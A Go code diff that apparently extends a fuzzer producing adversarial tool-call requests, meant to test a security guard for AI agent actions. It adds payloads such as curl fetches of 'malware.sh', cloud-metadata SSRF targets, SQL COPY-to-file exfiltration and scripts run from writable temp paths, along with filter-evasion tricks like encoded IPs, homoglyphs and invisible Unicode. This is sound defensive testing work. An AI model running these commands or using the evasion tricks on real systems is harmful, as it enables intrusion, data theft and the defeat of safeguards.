@@ -2,11 +2,16 @@ package main
 
 import (
 	"encoding/base64"
+	"encoding/binary"
 	"fmt"
 	"math/rand/v2"
+	"net"
 	"net/url"
+	"regexp"
 	"strings"
 )
+
+var ipv4InURLRegex = regexp.MustCompile(`(https?://)(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})`)
 
 // Stage IDs for 64-bit seed mixing
 const (
@@ -120,7 +125,7 @@ func (s *Sampler) sampleTool(r *rand.Rand, adversarial bool, idx uint64) map[str
 		req["tool_call"] = s.applyCaseMix("shell_run", r)
 	}
 
-	astChoice := r.IntN(7)
+	astChoice := r.IntN(8)
 	var cmd string
 	ast := s.space.Generators.ArgsCmd.AdversarialAST
 	switch astChoice {
@@ -136,16 +141,26 @@ func (s *Sampler) sampleTool(r *rand.Rand, adversarial bool, idx uint64) map[str
 		cmd = ast.Subshells[r.IntN(len(ast.Subshells))]
 	case 5:
 		cmd = fmt.Sprintf("rm %s /tmp/dir_%d", ast.RandomFlags[r.IntN(len(ast.RandomFlags))], idx)
+	case 6:
+		// IP integer/octal/hex curl targeting prod or link-local
+		targetIP := "10.0.0.1"
+		if r.Float64() < 0.5 {
+			targetIP = "169.254.169.254"
+		}
+		cmd = fmt.Sprintf("curl http://%s/malware.sh -o /tmp/p.sh", s.GenerateIPVariant(targetIP, r))
 	default:
 		bin := ast.BinaryPaths[r.IntN(len(ast.BinaryPaths))]
-		cmd = fmt.Sprintf("%s -c 'curl 167772161'", bin)
+		targetIP := s.GenerateIPVariant("10.0.0.1", r)
+		cmd = fmt.Sprintf("%s -c 'curl %s'", bin, targetIP)
 	}
 
 	cmd = s.mutateString(cmd, r)
-	// Occasionally test non-standard arg keys (e.g. exec or argv)
-	if r.Float64() < 0.2 {
+	// Occasionally test non-standard arg keys (e.g. exec, argv, run, execute, command_line)
+	if r.Float64() < 0.25 {
+		nonStandardKeys := []string{"exec", "argv", "run", "execute", "command_line"}
+		k := nonStandardKeys[r.IntN(len(nonStandardKeys))]
 		req["args"] = map[string]any{
-			"exec": cmd,
+			k: cmd,
 		}
 	} else {
 		req["args"] = map[string]any{
@@ -248,25 +263,40 @@ func (s *Sampler) sampleHTTP(r *rand.Rand, adversarial bool, idx uint64) map[str
 	}
 
 	// Adversarial HTTP
-	kind := r.IntN(3)
+	kind := r.IntN(4)
 	ips := s.space.Generators.ArgsHost.AdversarialIP
+	var host string
 	switch kind {
 	case 0:
 		// Metadata 169.254.169.254
 		meta := ips.Metadata[r.IntN(len(ips.Metadata))]
 		req["resource"] = meta
-		req["host"] = "169.254.169.254"
+		host = "169.254.169.254"
 	case 1:
 		// Decimal / Octal IP
 		ip := ips.DecimalOctal[r.IntN(len(ips.DecimalOctal))]
+		host = ip
 		req["resource"] = fmt.Sprintf("http://%s/api", ip)
-		req["host"] = ip
+	case 2:
+		// Generated IP variant (integer, octal, hex)
+		targetIP := "10.0.0.1"
+		if r.Float64() < 0.5 {
+			targetIP = "169.254.169.254"
+		}
+		host = s.GenerateIPVariant(targetIP, r)
+		req["resource"] = fmt.Sprintf("http://%s/api", host)
 	default:
-		// IPv6 mapped
-		ip := ips.IPv6Mapped[r.IntN(len(ips.IPv6Mapped))]
-		req["resource"] = fmt.Sprintf("http://%s/api", ip)
-		req["host"] = ip
+		// IPv6 mapped or domain with word-joiner / Cyrillic homoglyph
+		if r.Float64() < 0.5 {
+			ip := ips.IPv6Mapped[r.IntN(len(ips.IPv6Mapped))]
+			host = ip
+			req["resource"] = fmt.Sprintf("http://%s/api", ip)
+		} else {
+			host = s.mutateString("prod-api.internal", r)
+			req["resource"] = fmt.Sprintf("https://%s/secrets", host)
+		}
 	}
+	req["host"] = host
 
 	if r.Float64() < 0.3 {
 		req["action"] = "POST"
@@ -295,13 +325,13 @@ func (s *Sampler) sampleDB(r *rand.Rand, adversarial bool, idx uint64) map[strin
 
 	// Adversarial DB
 	dbChoice := s.space.Generators.Databases[r.IntN(len(s.space.Generators.Databases))]
-	if r.Float64() < 0.3 {
+	if r.Float64() < 0.4 {
 		dbChoice = s.mutateString(dbChoice, r)
 	}
 
 	advSQL := s.space.Generators.ArgsSQL.AdversarialBypass
 	var sql string
-	choice := r.IntN(6)
+	choice := r.IntN(7)
 	switch choice {
 	case 0:
 		sql = advSQL.CTEs[r.IntN(len(advSQL.CTEs))]
@@ -313,6 +343,8 @@ func (s *Sampler) sampleDB(r *rand.Rand, adversarial bool, idx uint64) map[strin
 		sql = advSQL.Comments[r.IntN(len(advSQL.Comments))]
 	case 4:
 		sql = advSQL.CopyTo[r.IntN(len(advSQL.CopyTo))]
+	case 5:
+		sql = fmt.Sprintf("COPY (SELECT * FROM orders LIMIT 9) TO '/tmp/f_%d'", idx%10)
 	default:
 		sql = advSQL.DangerousFunctions[r.IntN(len(advSQL.DangerousFunctions))]
 	}
@@ -380,8 +412,14 @@ func (s *Sampler) sampleDocker(r *rand.Rand, adversarial bool, _ uint64) map[str
 	c := containers[r.IntN(len(containers))]
 	act := actions[r.IntN(len(actions))]
 
+	if r.Float64() < 0.3 {
+		c = "teknikalidnew-db-1"
+		protectedActs := []string{"inspect", "logs", "stats"}
+		act = protectedActs[r.IntN(len(protectedActs))]
+	}
+
 	req["action"] = act
-	req["resource"] = c
+	req["resource"] = s.mutateString(c, r)
 
 	if r.Float64() < 0.4 {
 		req["args"] = map[string]any{
@@ -407,9 +445,26 @@ func (s *Sampler) sampleSSH(r *rand.Rand, adversarial bool, idx uint64) map[stri
 	}
 
 	req["action"] = "exec"
-	req["host"] = s.space.Generators.SSH.Hosts[r.IntN(len(s.space.Generators.SSH.Hosts))]
+	host := s.space.Generators.SSH.Hosts[r.IntN(len(s.space.Generators.SSH.Hosts))]
+	if r.Float64() < 0.3 {
+		if r.Float64() < 0.5 {
+			host = s.GenerateIPVariant("10.0.0.1", r)
+		} else {
+			host = s.mutateString(host, r)
+		}
+	}
+	req["host"] = host
 	req["user"] = s.space.Generators.SSH.Users[r.IntN(len(s.space.Generators.SSH.Users))]
-	req["command"] = s.mutateString(fmt.Sprintf("sh /tmp/p_%d.sh", idx%5), r)
+
+	writablePaths := []string{"/tmp/p_%d.sh", "/var/tmp/x_%d.sh", "/dev/shm/s_%d.sh"}
+	selectedPath := fmt.Sprintf(writablePaths[r.IntN(len(writablePaths))], idx%5)
+	var cmd string
+	if r.Float64() < 0.5 {
+		cmd = fmt.Sprintf("sh %s", selectedPath)
+	} else {
+		cmd = fmt.Sprintf("bash %s", selectedPath)
+	}
+	req["command"] = s.mutateString(cmd, r)
 	return req
 }
 
@@ -426,9 +481,58 @@ func (s *Sampler) applyCaseMix(str string, r *rand.Rand) string {
 	return string(runes)
 }
 
+// GenerateIPVariant produces an integer, octal, hex, or dotted variant of an IPv4 string.
+func (s *Sampler) GenerateIPVariant(ipStr string, r *rand.Rand) string {
+	clean := strings.Trim(strings.TrimSpace(ipStr), "[]")
+	ip := net.ParseIP(clean)
+	if ip == nil {
+		return ipStr
+	}
+	v4 := ip.To4()
+	if v4 == nil {
+		return ipStr
+	}
+	ipInt := binary.BigEndian.Uint32(v4)
+
+	mode := r.IntN(4)
+	switch mode {
+	case 0:
+		// 32-bit integer decimal: e.g. 167772161 (10.0.0.1)
+		return fmt.Sprintf("%d", ipInt)
+	case 1:
+		// Octal dotted: e.g. 012.0.0.1
+		return fmt.Sprintf("0%o.%d.%d.%d", v4[0], v4[1], v4[2], v4[3])
+	case 2:
+		// 32-bit hex: e.g. 0x0a000001
+		return fmt.Sprintf("0x%08x", ipInt)
+	default:
+		// Dotted hex: e.g. 0x0a.0x00.0x00.0x01
+		return fmt.Sprintf("0x%02x.0x%02x.0x%02x.0x%02x", v4[0], v4[1], v4[2], v4[3])
+	}
+}
+
+func (s *Sampler) mutateIPInURL(text string, r *rand.Rand) string {
+	return ipv4InURLRegex.ReplaceAllStringFunc(text, func(match string) string {
+		sub := ipv4InURLRegex.FindStringSubmatch(match)
+		if len(sub) == 3 {
+			return sub[1] + s.GenerateIPVariant(sub[2], r)
+		}
+		return match
+	})
+}
+
 // mutateString injects adversarial unicode, encodings, or special characters.
 func (s *Sampler) mutateString(val string, r *rand.Rand) string {
-	mode := r.IntN(8)
+	if val == "" {
+		return val
+	}
+
+	// If val contains an IP in URL, mutate it occasionally
+	if strings.Contains(val, "://") && r.Float64() < 0.3 {
+		val = s.mutateIPInURL(val, r)
+	}
+
+	mode := r.IntN(12)
 	switch mode {
 	case 0:
 		// Word joiner (\u2060)
@@ -436,31 +540,60 @@ func (s *Sampler) mutateString(val string, r *rand.Rand) string {
 			mid := len(val) / 2
 			return val[:mid] + "\u2060" + val[mid:]
 		}
+		return "\u2060" + val
 	case 1:
+		// Soft hyphen (\u00ad)
+		if len(val) > 2 {
+			mid := len(val) / 2
+			return val[:mid] + "\u00ad" + val[mid:]
+		}
+		return "\u00ad" + val
+	case 2:
+		// Zero width BOM (\ufeff)
+		return "\ufeff" + val
+	case 3:
 		// Zero width space (\u200b)
 		return "\u200b" + val
-	case 2:
-		// Cyrillic homoglyph (e.g. replace 'o' with cyrillic 'о' \u043e, or 'p' with \u0440)
-		val = strings.Replace(val, "o", "\u043e", 1)
-		val = strings.Replace(val, "p", "\u0440", 1)
-		return val
-	case 3:
+	case 4:
+		// Cyrillic homoglyphs:
+		// г (U+0433) for r, р (U+0440) for p, о (U+043e) for o,
+		// а (U+0430) for a, е (U+0435) for e, с (U+0441) for c
+		res := val
+		res = strings.Replace(res, "r", "\u0433", 1)
+		res = strings.Replace(res, "p", "\u0440", 1)
+		res = strings.Replace(res, "o", "\u043e", 1)
+		res = strings.Replace(res, "a", "\u0430", 1)
+		res = strings.Replace(res, "e", "\u0435", 1)
+		res = strings.Replace(res, "c", "\u0441", 1)
+		return res
+	case 5:
+		// IP variant encoding if val is an IP
+		if ip := net.ParseIP(strings.Trim(val, "[]")); ip != nil && ip.To4() != nil {
+			return s.GenerateIPVariant(val, r)
+		}
+		return "\u2060" + val
+	case 6:
 		// RTL override (\u202e)
 		return "\u202e" + val
-	case 4:
+	case 7:
 		// Null byte (\u0000)
 		return val + "\u0000"
-	case 5:
+	case 8:
 		// Base64 encoding
 		return base64.StdEncoding.EncodeToString([]byte(val))
-	case 6:
+	case 9:
 		// URL encoding
 		return url.QueryEscape(val)
-	default:
+	case 10:
 		// Double URL encoding
 		return url.QueryEscape(url.QueryEscape(val))
+	default:
+		// Word joiner + soft hyphen combined
+		if len(val) > 3 {
+			return val[:1] + "\u2060" + val[1:2] + "\u00ad" + val[2:]
+		}
+		return "\u2060" + val + "\u2060"
 	}
-	return val
 }
 
 // nestMap creates nested JSON structures of specified depth.
